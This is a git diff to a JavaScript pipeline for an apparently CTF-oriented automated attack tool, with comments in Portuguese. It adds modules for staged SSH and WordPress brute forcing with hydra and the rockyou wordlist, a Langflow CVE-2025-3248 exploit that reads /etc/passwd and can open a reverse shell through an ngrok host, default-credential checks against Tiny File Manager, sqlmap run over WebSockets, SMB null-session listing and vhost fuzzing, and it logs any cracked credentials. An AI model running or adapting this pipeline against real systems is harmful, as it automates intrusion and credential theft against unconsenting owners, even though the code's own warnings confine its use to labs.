@@ -16,6 +16,22 @@ import { runCredentialReuseProbe, runDisclosureHunt, runWordpressCredentialReuse
 import { runWordpressFocusProbe } from './wordpress-focus-probe.js';
 import { extractWpscanFindings, runWpscanJson } from '../modules/wpscan.js';
 import { normalizeExtraHostnames } from './extra-hosts-web.js';
+import { runExtendedServiceProbe } from './extended-service-probe.js';
+import { runOpenApiDiscovery } from './openapi-probe.js';
+import { runVhostPrefixFuzz } from './vhost-prefix-fuzz.js';
+import {
+  runSshHydraBrute,
+  runSshHydraBruteAutoFull,
+  runSshHydraBruteFromWordlistPair,
+  resolveSolydSshWordlistPaths,
+  sshBruteManualReady,
+} from './ssh-brute-probe.js';
+import { runLangflowExploitProbe } from './langflow-exploit-probe.js';
+import { runTinyFileManagerProbe } from './tinyfilemanager-probe.js';
+import { runSqlmapWsProbe } from './sqlmap-ws-probe.js';
+import { runWpHydraBrute } from './hydra-wp-brute-probe.js';
+import { runActiveMqProbe } from './activemq-probe.js';
+import { runUploadSurfaceProbe } from './upload-surface.js';
 
 /** Uma seed por origem (ex.: :80 vs :443 vs :8080) para dir-enum não ficar só nas primeiras URLs da mesma porta. */
 function collectDirEnumSeedUrls(webResponses, { maxOrigins = 8 } = {}) {
@@ -51,6 +67,34 @@ export async function runGhostCtfPipeline({
   hostsOnlyWeb = false,
   udpScan = false,
   tcpAllPorts = false,
+  /** IPv4 extra com MySQL (ex.: CTF9 DB noutro EC2) — requer módulo `secondaryMysqlProbe`. */
+  secondaryMysqlHosts = [],
+  /** Domínio apex para fuzz `prefix.<domínio>` no IP (ex.: projects-blogo.sy) — módulo `vhostPrefixFuzz`. */
+  vhostBaseDomain = '',
+  /** Prefixos extra (vírgula ou linha) para vhost fuzz. */
+  vhostFuzzExtraPrefixes = '',
+  /** SSH brute (hydra) — só com módulo `sshBruteProbe` + wordlist em disco. */
+  sshBruteUsers = '',
+  sshBruteWordlistPath = '',
+  sshBruteMaxPasswords = 150,
+  /** Com `sshBruteAutoHydra` + módulo: hydra SecLists+rockyou por último se subset não crackar ou sem user/wordlist. */
+  sshBruteAutoHydra = false,
+  /** Timeout do hydra automático (ms), 5–120 min. */
+  sshBruteAutoTimeoutMs = 1_800_000,
+  /** Hydra com `wordlists/usersolyd.txt` + `passwordsolyd.txt` (histórico Solyd) — entre subset e rockyou. */
+  sshBruteSolydWordlists = false,
+  /** Langflow CVE-2025-3248 / vértices — módulo `langflowExploitProbe`. */
+  langflowHostHeader = '',
+  langflowTryAllOrigins = false,
+  langflowVerticesShell = false,
+  langflowNgrokHost = '',
+  langflowNgrokPort = 0,
+  langflowBuildFlowId = '00000000-0000-0000-0000-000000000001',
+  langflowAlsoTryFlagPath = false,
+  /** Hydra wp-login — módulo `hydraWpBruteProbe` (wordlist em disco). */
+  hydraWpBruteUsers = '',
+  hydraWpBruteWordlistPath = '',
+  hydraWpBruteMaxPasswords = 150,
   emit,
   saveRun,
 }) {
@@ -265,6 +309,279 @@ export async function runGhostCtfPipeline({
     }
   }
 
+  /** @type {{ enabled: boolean; cracked: boolean; username?: string; password?: string; error?: string; autoHydra?: boolean; autoHydraRan?: boolean; solydWordlists?: boolean; solydWordlistsRan?: boolean }} */
+  let sshBruteSummary = {
+    enabled: false,
+    cracked: false,
+    autoHydra: false,
+    autoHydraRan: false,
+    solydWordlists: false,
+    solydWordlistsRan: false,
+  };
+  if (Array.isArray(modules) && modules.includes('sshBruteProbe')) {
+    sshBruteSummary.enabled = true;
+    const brutePort = sshPorts.length ? sshPorts[0] : 22;
+    if (!sshPorts.length) {
+      log('SSH brute: nmap não listou SSH — hydra usará porta 22 na mesma.', 'warn');
+    }
+    log(
+      'SSH brute (hydra): módulo AGRESSIVO — só em alvos autorizados. Subset limitado de passwords.',
+      'warn',
+    );
+    const autoHydraWanted = Boolean(sshBruteAutoHydra);
+    sshBruteSummary.autoHydra = autoHydraWanted;
+    const solydWordlistsWanted = Boolean(sshBruteSolydWordlists);
+    sshBruteSummary.solydWordlists = solydWordlistsWanted;
+    const manualReady = sshBruteManualReady(sshBruteUsers, sshBruteWordlistPath);
+    let cracked = false;
+
+    try {
+      if (manualReady) {
+        const hr = await runSshHydraBrute({
+          ip,
+          port: brutePort,
+          usernamesRaw: sshBruteUsers,
+          wordlistPath: sshBruteWordlistPath,
+          maxPasswords: Math.min(500, Math.max(20, Number(sshBruteMaxPasswords) || 150)),
+          log,
+          timeoutMs: 240000,
+        });
+        if (hr.cracked && hr.username && hr.password) {
+          cracked = true;
+          sshBruteSummary.cracked = true;
+          sshBruteSummary.username = hr.username;
+          sshBruteSummary.password = hr.password;
+          addFinding(
+            {
+              type: 'secret',
+              prio: 'high',
+              score: 95,
+              value: `SSH credencial (hydra): ${hr.username}`,
+              meta: `password=${hr.password} · ${ip}:${brutePort}`,
+              url: null,
+            },
+            'secrets',
+          );
+          intel(`SSH BRUTE: ${hr.username}:${hr.password} @ ${ip}:${brutePort} — testa login manual`);
+        } else if (hr.error) {
+          sshBruteSummary.error = hr.error;
+        }
+      } else {
+        log(
+          'SSH brute: utilizador ou wordlist em falta — subset manual (hydra truncado) não foi executado.',
+          'warn',
+        );
+      }
+
+      if (solydWordlistsWanted && !cracked) {
+        log(
+          'SSH brute: wordlists Solyd (usersolyd + passwordsolyd) — fase intermédia após subset manual.',
+          'info',
+        );
+        const sp = resolveSolydSshWordlistPaths();
+        const sr = await runSshHydraBruteFromWordlistPair({
+          ip,
+          port: brutePort,
+          userListPath: sp.usersFile,
+          passListPath: sp.passwordsFile,
+          log,
+          timeoutMs: 360_000,
+          logLabel: 'SSH brute Solyd',
+        });
+        sshBruteSummary.solydWordlistsRan = true;
+        if (sr.cracked && sr.username && sr.password) {
+          cracked = true;
+          sshBruteSummary.cracked = true;
+          sshBruteSummary.username = sr.username;
+          sshBruteSummary.password = sr.password;
+          addFinding(
+            {
+              type: 'secret',
+              prio: 'high',
+              score: 95,
+              value: `SSH credencial (hydra Solyd): ${sr.username}`,
+              meta: `password=${sr.password} · ${ip}:${brutePort} · wordlists=usersolyd/passwordsolyd`,
+              url: null,
+            },
+            'secrets',
+          );
+          intel(`SSH BRUTE SOLYD: ${sr.username}:${sr.password} @ ${ip}:${brutePort}`);
+        } else if (sr.error && !sshBruteSummary.error) {
+          sshBruteSummary.error = sr.error;
+        }
+      }
+
+      if (autoHydraWanted && !cracked) {
+        const autoTimeout = Math.min(
+          7_200_000,
+          Math.max(300_000, Number(sshBruteAutoTimeoutMs) || 1_800_000),
+        );
+        log(
+          'SSH brute: a seguir, modo AUTO (SecLists + rockyou) — última fase; pode demorar muito.',
+          'warn',
+        );
+        const ar = await runSshHydraBruteAutoFull({
+          ip,
+          port: brutePort,
+          log,
+          timeoutMs: autoTimeout,
+        });
+        sshBruteSummary.autoHydraRan = true;
+        if (ar.cracked && ar.username && ar.password) {
+          sshBruteSummary.cracked = true;
+          sshBruteSummary.username = ar.username;
+          sshBruteSummary.password = ar.password;
+          addFinding(
+            {
+              type: 'secret',
+              prio: 'high',
+              score: 95,
+              value: `SSH credencial (hydra AUTO): ${ar.username}`,
+              meta: `password=${ar.password} · ${ip}:${brutePort} · mode=SecLists+rockyou`,
+              url: null,
+            },
+            'secrets',
+          );
+          intel(`SSH BRUTE AUTO: ${ar.username}:${ar.password} @ ${ip}:${brutePort}`);
+        } else if (ar.error) {
+          if (!sshBruteSummary.error) sshBruteSummary.error = ar.error;
+          log(`SSH brute AUTO: ${ar.error}`, 'warn');
+        }
+      } else if (!autoHydraWanted && !solydWordlistsWanted && !manualReady) {
+        log(
+          'SSH brute: sem subset manual — ativa “Wordlists Solyd” e/ou “Hydra automático (SecLists + rockyou)” para hydra com listas em disco.',
+          'info',
+        );
+      }
+    } catch (e) {
+      sshBruteSummary.error = e?.message || String(e);
+      log(`SSH brute: ${sshBruteSummary.error}`, 'warn');
+    }
+  }
+
+  /** @type {{ enabled: boolean; hits: number }} */
+  let activeMqSummary = { enabled: false, hits: 0 };
+  if (Array.isArray(modules) && modules.includes('activeMqProbe')) {
+    activeMqSummary.enabled = true;
+    try {
+      log('ActiveMQ probe: HTTP porta 8161 (e indícios no banner)...', 'info');
+      const am = await runActiveMqProbe({ ip, log, timeoutMs: 8000 });
+      const hh = Array.isArray(am?.hits) ? am.hits : [];
+      activeMqSummary.hits = hh.length;
+      for (const h of hh) {
+        addFinding(
+          {
+            type: 'tech',
+            prio: 'high',
+            score: 78,
+            value: 'Possível Apache ActiveMQ / consola 8161',
+            meta: h.evidence || '8161',
+            url: h.url || null,
+          },
+          'endpoints',
+        );
+        if (h.intel) intel(h.intel);
+      }
+      if (!hh.length) log('ActiveMQ probe: sem confirmação em :8161', 'info');
+    } catch (e) {
+      log(`ActiveMQ probe: ${e?.message || String(e)}`, 'warn');
+    }
+  }
+
+  /** @type {{ enabled: boolean; hosts: string[]; okPorts: string[]; errors: string[] }} */
+  let secondaryMysqlSummary = { enabled: false, hosts: [], okPorts: [], errors: [] };
+  const smHosts = Array.isArray(secondaryMysqlHosts)
+    ? [...new Set(secondaryMysqlHosts.map((h) => String(h || '').trim()).filter(Boolean))].slice(0, 8)
+    : [];
+  if (Array.isArray(modules) && modules.includes('secondaryMysqlProbe')) {
+    secondaryMysqlSummary.enabled = true;
+    if (!smHosts.length) {
+      log('MySQL secundário: módulo ON — indica IPv4 na caixa “IPs MySQL extra” (um por linha).', 'warn');
+    } else {
+      secondaryMysqlSummary.hosts = smHosts;
+      log(`MySQL secundário: a sondar handshake em ${smHosts.length} host(s) (porta 3306)...`, 'info');
+      for (const mh of smHosts) {
+        try {
+          const mr = await probeMysqlService({ host: mh, port: 3306, timeoutMs: 12000 });
+          if (mr.ok) {
+            secondaryMysqlSummary.okPorts.push(`${mh}:3306`);
+            const meta = [
+              mr.serverVersion ? `version=${mr.serverVersion}` : null,
+              Number.isFinite(mr.protocolVersion) ? `proto=${mr.protocolVersion}` : null,
+            ]
+              .filter(Boolean)
+              .join(' · ');
+            addFinding(
+              {
+                type: 'endpoint',
+                prio: 'med',
+                score: 67,
+                value: `MySQL ativo @ ${mh}:3306 (host secundário)`,
+                meta: meta || 'handshake MySQL recebido',
+                url: null,
+              },
+              'endpoints',
+            );
+            log(`MySQL secundário ${mh}:3306 — ${mr.serverVersion || 'handshake OK'}`, 'success');
+            intel(`MySQL (secundário) ${mh}:3306 — ${mr.serverVersion || 'versão não exposta'}`);
+          } else {
+            secondaryMysqlSummary.errors.push(`${mh}:${mr.error || 'sem handshake'}`);
+            log(`MySQL secundário ${mh}:3306 — ${mr.error || 'sem handshake'}`, 'info');
+          }
+        } catch (e) {
+          const msg = e?.message || String(e);
+          secondaryMysqlSummary.errors.push(`${mh}:${msg}`);
+          log(`MySQL secundário ${mh}: ${msg}`, 'warn');
+        }
+      }
+    }
+  }
+
+  /** @type {{ enabled: boolean; mailProbes: number; smbAttempted: boolean; smbInteresting?: boolean }} */
+  let extendedSvcSummary = { enabled: false, mailProbes: 0, smbAttempted: false };
+  if (Array.isArray(modules) && modules.includes('extendedServiceProbe')) {
+    extendedSvcSummary.enabled = true;
+    try {
+      log('Extended services: mail (POP3/IMAP/SMTP) + SMB (smbclient) quando o nmap indicar...', 'info');
+      const ex = await runExtendedServiceProbe({ ip, nmapRows, log });
+      extendedSvcSummary.mailProbes = Array.isArray(ex.mailResults) ? ex.mailResults.length : 0;
+      extendedSvcSummary.smbAttempted = Boolean(ex.smb?.attempted);
+      extendedSvcSummary.smbInteresting = Boolean(ex.smb?.interesting);
+      for (const m of ex.mailResults || []) {
+        const tr = String(m.transcript || '').replace(/\s+/g, ' ').trim().slice(0, 480);
+        addFinding(
+          {
+            type: 'endpoint',
+            prio: 'low',
+            score: 38,
+            value: `Mail/TCP sondagem ${ip}:${m.port} (${m.kind || 'tcp'})`,
+            meta: tr || m.error || 'sem transcrição',
+            url: null,
+          },
+          'endpoints',
+        );
+      }
+      if (ex.smb?.attempted && ex.smb?.interesting) {
+        addFinding(
+          {
+            type: 'endpoint',
+            prio: 'high',
+            score: 74,
+            value: `SMB — listagem partilhável @ ${ip} (smbclient -L //IP -N)`,
+            meta: String(ex.smb.stdout || '').slice(0, 1200).replace(/\s+/g, ' '),
+            url: null,
+          },
+          'endpoints',
+        );
+        intel(`SMB: rever output smbclient — possíveis shares em ${ip}`);
+      }
+    } catch (e) {
+      log(`Extended services: ${e?.message || String(e)}`, 'warn');
+    }
+  } else {
+    log('Extended services (mail/SMB): OFF (ative em Modules)', 'info');
+  }
+
   // Playbook inicial (pós-nmap)
   try {
     const sug = buildCtfPlaybookSuggestions({ ip, findings });
@@ -359,6 +676,46 @@ export async function runGhostCtfPipeline({
     log('Hostnames (/etc/hosts): OFF (ative em Modules se usares nomes no /etc/hosts)', 'info');
   }
 
+  /** @type {{ enabled: boolean; hits: number; baseDomain: string }} */
+  let vhostFuzzSummary = { enabled: false, hits: 0, baseDomain: '' };
+  if (Array.isArray(modules) && modules.includes('vhostPrefixFuzz')) {
+    vhostFuzzSummary.enabled = true;
+    const bd = String(vhostBaseDomain || '').trim();
+    vhostFuzzSummary.baseDomain = bd;
+    if (!bd) {
+      log('VHost prefix fuzz: indica o domínio apex (ex.: projects-blogo.sy) na caixa dedicada.', 'warn');
+    } else {
+      try {
+        log(`VHost prefix fuzz: GET http://${ip}/ com Host: <prefix>.${bd} (lista interna + extra)...`, 'info');
+        const vf = await runVhostPrefixFuzz({
+          ip,
+          baseDomain: bd,
+          extraPrefixes: vhostFuzzExtraPrefixes,
+          log,
+        });
+        const hitList = Array.isArray(vf.hits) ? vf.hits : [];
+        vhostFuzzSummary.hits = hitList.length;
+        for (const h of hitList) {
+          addFinding(
+            {
+              type: 'endpoint',
+              prio: 'med',
+              score: 62,
+              value: `VHost candidato: Host: ${h.hostHeader}`,
+              meta: `HTTP ${h.status} · corpo=${h.bodyLen} B vs baseline ${h.baselineLen} B (Δ=${h.delta})`,
+              url: `http://${ip}/`,
+            },
+            'endpoints',
+          );
+          intel(`VHOST: curl -sI "http://${ip}/" -H "Host: ${h.hostHeader}"`);
+        }
+        if (!hitList.length) log('VHost prefix fuzz: nenhum prefixo com resposta claramente distinta do baseline.', 'info');
+      } catch (e) {
+        log(`VHost prefix fuzz: ${e?.message || String(e)}`, 'warn');
+      }
+    }
+  }
+
   let robotsFetched = 0;
   let robotsDisallowFetched = 0;
   try {
@@ -441,17 +798,27 @@ export async function runGhostCtfPipeline({
         );
       }
       for (const cr of creds.slice(0, 12)) {
+        const wpExtra =
+          cr.wpDbHost || cr.wpDbName
+            ? ` · DB_NAME=${cr.wpDbName || '?'} · DB_HOST=${cr.wpDbHost || '?'}`
+            : '';
         addFinding(
           {
             type: 'secret',
             prio: 'high',
             score: 88,
             value: `Credencial potencial: ${cr.username}:${cr.password}`,
-            meta: `source=${cr.source} · url=${cr.url || '-'}`,
+            meta: `source=${cr.source} · url=${cr.url || '-'}${wpExtra}`,
             url: cr.url || null,
           },
           'secrets',
         );
+        if (String(cr.source || '').includes('wp-config') && (cr.username || cr.password)) {
+          const h = cr.wpDbHost || 'localhost';
+          intel(
+            `wp-config → MariaDB: mysql -h ${h} -u ${cr.username} -p   (se localhost, entra por SSH no alvo primeiro)`,
+          );
+        }
       }
       log(`Disclosure Hunt: fetched=${disclosureSummary.fetched} · comments=${comments.length} · creds=${creds.length}`, 'info');
 
@@ -541,6 +908,123 @@ export async function runGhostCtfPipeline({
     else log('HTML links: nenhum URL novo. Ver logs “[http] link do HTML”.', 'info');
   } catch (e) {
     log(`HTML link crawl: ${e?.message || String(e)}`, 'warn');
+  }
+
+  /** @type {{ enabled: boolean; pages: number; hints: number }} */
+  let uploadSurfaceSummary = { enabled: false, pages: 0, hints: 0 };
+  if (Array.isArray(modules) && modules.includes('uploadSurfaceProbe')) {
+    uploadSurfaceSummary.enabled = true;
+    try {
+      log('Upload surface: HTML por type=file / multipart/form-data…', 'info');
+      const up = runUploadSurfaceProbe(webResponses);
+      uploadSurfaceSummary.pages = Number(up.pages || 0);
+      uploadSurfaceSummary.hints = Number(up.hints || 0);
+      for (const fd of up.findings || []) {
+        addFinding(fd, 'endpoints');
+      }
+      if (uploadSurfaceSummary.hints) {
+        log(`Upload surface: ${uploadSurfaceSummary.hints} formulário(s) em ${uploadSurfaceSummary.pages} página(s)`, 'success');
+      } else {
+        log('Upload surface: sem indícios em HTML obtido por curl.', 'info');
+      }
+    } catch (e) {
+      log(`Upload surface: ${e?.message || String(e)}`, 'warn');
+    }
+  }
+
+  /** @type {{ enabled: boolean; fetched: number; urls: string[] }} */
+  let openapiSummary = { enabled: false, fetched: 0, urls: [] };
+  if (Array.isArray(modules) && modules.includes('openapiProbe')) {
+    openapiSummary.enabled = true;
+    try {
+      log('OpenAPI probe: GET /openapi.json, /v3/api-docs, … por origem HTTP descoberta...', 'info');
+      const oa = await runOpenApiDiscovery({
+        webResponses,
+        log,
+        timeoutMs: 12000,
+        maxBodyBytes: 250000,
+        appendResponses: true,
+      });
+      openapiSummary.fetched = Number(oa?.fetched || 0);
+      openapiSummary.urls = Array.isArray(oa?.urls) ? oa.urls : [];
+      for (const u of openapiSummary.urls) {
+        addFinding(
+          {
+            type: 'endpoint',
+            prio: 'med',
+            score: 58,
+            value: 'OpenAPI / documento API provável',
+            meta: String(u),
+            url: u,
+          },
+          'endpoints',
+        );
+      }
+    } catch (e) {
+      log(`OpenAPI probe: ${e?.message || String(e)}`, 'warn');
+    }
+  } else {
+    log('OpenAPI probe: OFF (ative em Modules)', 'info');
+  }
+
+  /** @type {{ enabled: boolean; hits: number; verticesPosted: boolean; attempts: number }} */
+  let langflowExploitSummary = { enabled: false, hits: 0, verticesPosted: false, attempts: 0 };
+  if (Array.isArray(modules) && modules.includes('langflowExploitProbe')) {
+    langflowExploitSummary.enabled = true;
+    log(
+      'Langflow exploit (CVE-2025-3248 / vértices): módulo CRÍTICO — só em CTF/lab explícito.',
+      'warn',
+    );
+    try {
+      const readPaths = ['/etc/passwd'];
+      if (langflowAlsoTryFlagPath) readPaths.push('/flag.txt');
+      const lf = await runLangflowExploitProbe({
+        webResponses,
+        ip,
+        log,
+        tryAllOrigins: Boolean(langflowTryAllOrigins),
+        hostHeader: String(langflowHostHeader || '').trim(),
+        readPaths,
+        verticesReverseShell: Boolean(langflowVerticesShell),
+        ngrokHost: String(langflowNgrokHost || '').trim(),
+        ngrokPort: Number(langflowNgrokPort) || 0,
+        buildFlowId: String(langflowBuildFlowId || '').trim(),
+      });
+      langflowExploitSummary.hits = Array.isArray(lf.validateHits) ? lf.validateHits.length : 0;
+      langflowExploitSummary.verticesPosted = Boolean(lf.verticesPosted);
+      langflowExploitSummary.attempts = Number(lf.validateAttempts || 0);
+      for (const h of lf.validateHits || []) {
+        addFinding(
+          {
+            type: 'endpoint',
+            prio: 'high',
+            score: 92,
+            value: `Langflow validate/code — possível exfil (${h.readPath})`,
+            meta: `HTTP ${h.httpCode} · ${h.snippet?.slice(0, 900) || ''}`,
+            url: h.url,
+          },
+          'endpoints',
+        );
+      }
+      ingestFlagFindingsFromWebResponses({
+        webResponses: (lf.validateHits || []).map((h) => ({
+          url: h.url,
+          finalUrl: h.url,
+          status: h.httpCode,
+          headersText: '',
+          bodyText: h.snippet || '',
+        })),
+        platformId,
+        foundFlagSet,
+        addFinding,
+        log,
+        maxTextLen: 50_000,
+      });
+    } catch (e) {
+      log(`Langflow exploit: ${e?.message || String(e)}`, 'warn');
+    }
+  } else {
+    log('Langflow exploit: OFF (ative em Modules)', 'info');
   }
 
   for (let i = countAfterInitialCurl; i < webResponses.length; i += 1) {
@@ -678,7 +1162,8 @@ export async function runGhostCtfPipeline({
       const lfi = await runLfiPasswdProbe({
         urls: lfiSeedUrls,
         log,
-        maxAttempts: 24,
+        /** Inclui tentativas em .php sem ? (param inject) — orçamento maior. */
+        maxAttempts: 96,
         timeoutMs: 12000,
         maxBodyBytes: 180000,
       });
@@ -735,6 +1220,37 @@ export async function runGhostCtfPipeline({
     }
   } else {
     log('LFI probe: OFF (ative em Modules)', 'info');
+  }
+
+  /** @type {{ enabled: boolean; hits: number }} */
+  const tinyFmSummary = { enabled: false, hits: 0 };
+  if (Array.isArray(modules) && modules.includes('tinyFmProbe')) {
+    tinyFmSummary.enabled = true;
+    try {
+      log('Tiny File Manager: teste de credenciais comuns (CTF)...', 'warn');
+      const tf = await runTinyFileManagerProbe(webResponses, { log, timeoutMs: 12000, maxOrigins: 4 });
+      const tfHits = Array.isArray(tf?.hits) ? tf.hits : [];
+      tinyFmSummary.hits = tfHits.length;
+      for (const h of tfHits) {
+        addFinding(
+          {
+            type: 'secret',
+            prio: 'high',
+            score: 94,
+            value: `TinyFM login provável: ${h.username}`,
+            meta: `password=${h.password} · ${h.url}`,
+            url: h.url,
+          },
+          'secrets',
+        );
+        intel(`TinyFM: ${h.username}:${h.password} @ ${h.url}`);
+      }
+      if (!tfHits.length) log('TinyFM probe: sem match com credenciais padrão', 'info');
+    } catch (e) {
+      log(`TinyFM probe: ${e?.message || String(e)}`, 'warn');
+    }
+  } else {
+    log('TinyFM probe: OFF (ative em Modules)', 'info');
   }
 
   if (Array.isArray(modules) && modules.includes('sqlmapProbe')) {
@@ -794,12 +1310,60 @@ export async function runGhostCtfPipeline({
     log('sqlmap probe: OFF (ative em Modules)', 'info');
   }
 
+  /** @type {{ enabled: boolean; attempts: number; hits: number }} */
+  const sqlmapWsSummary = { enabled: false, attempts: 0, hits: 0 };
+  if (Array.isArray(modules) && modules.includes('sqlmapWsProbe')) {
+    sqlmapWsSummary.enabled = true;
+    try {
+      log('sqlmap WebSocket: URLs ws:// / wss:// nos corpos HTML...', 'info');
+      const smw = await runSqlmapWsProbe({
+        webResponses,
+        log,
+        maxTargets: 3,
+        timeoutPerTargetMs: 120000,
+      });
+      if (!smw.ok && smw.reason === 'sqlmap_missing') {
+        log('sqlmap WebSocket: sqlmap não encontrado no PATH.', 'warn');
+      } else {
+        sqlmapWsSummary.attempts = Number(smw?.attempts || 0);
+        const wHits = Array.isArray(smw?.hits) ? smw.hits : [];
+        sqlmapWsSummary.hits = wHits.length;
+        for (const h of wHits) {
+          addFinding(
+            {
+              type: 'sqli',
+              prio: h.dbs?.length ? 'high' : 'med',
+              score: h.dbs?.length ? 94 : 85,
+              value: `Possível SQLi WebSocket (${h.data})`,
+              meta: `sqlmap ws · ${h.evidence || ''} · ${h.url}`,
+              url: h.url,
+            },
+            'params',
+          );
+          log(`SQLMap WS provável: ${h.url} (${h.evidence})`, 'success');
+        }
+        if (!wHits.length) {
+          log(`sqlmap WebSocket: sem evidência (tentativas=${sqlmapWsSummary.attempts})`, 'info');
+        }
+      }
+    } catch (e) {
+      log(`sqlmap WebSocket: ${e?.message || String(e)}`, 'warn');
+    }
+  } else {
+    log('sqlmap WebSocket: OFF (ative em Modules)', 'info');
+  }
+
   /** @type {{ enabled: boolean; originsTested: number; fetched: number; findings: number }} */
   const wpFocusSummary = { enabled: false, originsTested: 0, fetched: 0, findings: 0 };
+  /** @type {string[]} */
+  let lastWpTargetsForHydra = [];
+  /** @type {{ enabled: boolean; cracked: boolean; username?: string; password?: string; error?: string }} */
+  let wpHydraBruteSummary = { enabled: false, cracked: false };
   if (Array.isArray(modules) && modules.includes('wpFocusProbe')) {
     wpFocusSummary.enabled = true;
     try {
       const wp = await runWordpressFocusProbe(webResponses, { log, timeoutMs: 12000 });
+      lastWpTargetsForHydra = Array.isArray(wp?.wpTargets) ? wp.wpTargets : [];
       wpFocusSummary.originsTested = Number(wp?.originsTested || 0);
       wpFocusSummary.fetched = Number(wp?.fetched || 0);
       const ff = Array.isArray(wp?.findings) ? wp.findings : [];
@@ -886,6 +1450,59 @@ export async function runGhostCtfPipeline({
     }
   } else {
     log('WordPress focus: OFF (ative em Modules)', 'info');
+  }
+
+  if (Array.isArray(modules) && modules.includes('hydraWpBruteProbe')) {
+    wpHydraBruteSummary.enabled = true;
+    log('WP brute (hydra): http-post-form em wp-login.php — subset de passwords.', 'warn');
+    try {
+      const wpLoginUrls = new Set();
+      for (const b of lastWpTargetsForHydra) {
+        const base = String(b || '').replace(/\/$/, '');
+        if (base) wpLoginUrls.add(`${base}/wp-login.php`);
+      }
+      for (const r of webResponses || []) {
+        const raw = String(r?.finalUrl || r?.url || '').split('#')[0];
+        if (!raw || !/\/wp-login\.php/i.test(raw)) continue;
+        try {
+          const x = new URL(raw);
+          wpLoginUrls.add(`${x.origin}/wp-login.php`);
+        } catch {
+          wpLoginUrls.add(raw);
+        }
+      }
+      const uniq = [...wpLoginUrls].slice(0, 5);
+      const hr = await runWpHydraBrute({
+        wpLoginUrls: uniq,
+        usernamesRaw: hydraWpBruteUsers,
+        wordlistPath: hydraWpBruteWordlistPath,
+        maxPasswords: Math.min(500, Math.max(20, Number(hydraWpBruteMaxPasswords) || 150)),
+        log,
+        timeoutMs: 240000,
+      });
+      if (hr.cracked && hr.username && hr.password) {
+        wpHydraBruteSummary.cracked = true;
+        wpHydraBruteSummary.username = hr.username;
+        wpHydraBruteSummary.password = hr.password;
+        addFinding(
+          {
+            type: 'secret',
+            prio: 'high',
+            score: 96,
+            value: `WP login (hydra): ${hr.username}`,
+            meta: `password=${hr.password} · ${hr.loginUrl || uniq[0] || ''}`,
+            url: hr.loginUrl || uniq[0] || null,
+          },
+          'secrets',
+        );
+        intel(`WP BRUTE: ${hr.username}:${hr.password} — confirma no browser`);
+      } else if (hr.error) {
+        wpHydraBruteSummary.error = hr.error;
+      }
+    } catch (e) {
+      wpHydraBruteSummary.error = e?.message || String(e);
+      log(`WP brute (hydra): ${wpHydraBruteSummary.error}`, 'warn');
+    }
   }
 
   log('Scan de flags Solyd{...} e validação do formato (com base64/base32 decoding)...', 'info');
@@ -989,10 +1606,21 @@ export async function runGhostCtfPipeline({
       attempts: sqlmapSummary.attempts,
       hits: sqlmapSummary.hits,
     },
+    sqlmapWsProbe: sqlmapWsSummary,
+    tinyFmProbe: tinyFmSummary,
+    activeMqProbe: activeMqSummary,
+    hydraWpBruteProbe: wpHydraBruteSummary,
     vhostSitemapProbe: vhostSitemapSummary,
     disclosureProbe: disclosureSummary,
     credReuseProbe: credReuseSummary,
     wpFocusProbe: wpFocusSummary,
+    extendedServiceProbe: extendedSvcSummary,
+    secondaryMysqlProbe: secondaryMysqlSummary,
+    openapiProbe: openapiSummary,
+    vhostPrefixFuzz: vhostFuzzSummary,
+    sshBruteProbe: sshBruteSummary,
+    langflowExploitProbe: langflowExploitSummary,
+    uploadSurfaceProbe: uploadSurfaceSummary,
   };
 
   let saved = null;
